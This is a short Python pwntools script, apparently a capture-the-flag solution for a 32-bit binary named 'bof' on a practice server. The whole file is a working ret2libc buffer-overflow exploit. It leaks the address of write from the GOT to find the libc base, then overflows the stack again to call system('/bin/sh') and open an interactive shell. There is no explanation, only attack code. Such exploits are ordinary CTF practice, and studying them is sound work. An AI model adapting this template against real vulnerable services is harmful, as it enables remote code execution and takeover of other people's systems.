import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./bof')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./bof')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',29595)
			elf=ELF('./bof')
			libc=ELF('../../i386libc/x86_libc.so.6')

		
		pay='\x00'*0x70+p32(elf.plt['write'])+p32(0x80483E0)+p32(1)+p32(elf.got['write'])+p32(4)
		io.recv()
		io.send(pay)
		libc_base=u32(io.recv(4))-libc.sym['write']
		libc.address=libc_base
		success('libc_base:'+hex(libc_base))
		pay='\x00'*0x70+p32(libc.sym['system'])+p32(1)+p32(libc.search('/bin/sh\x00').next())
		io.recv()
		io.send(pay)
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue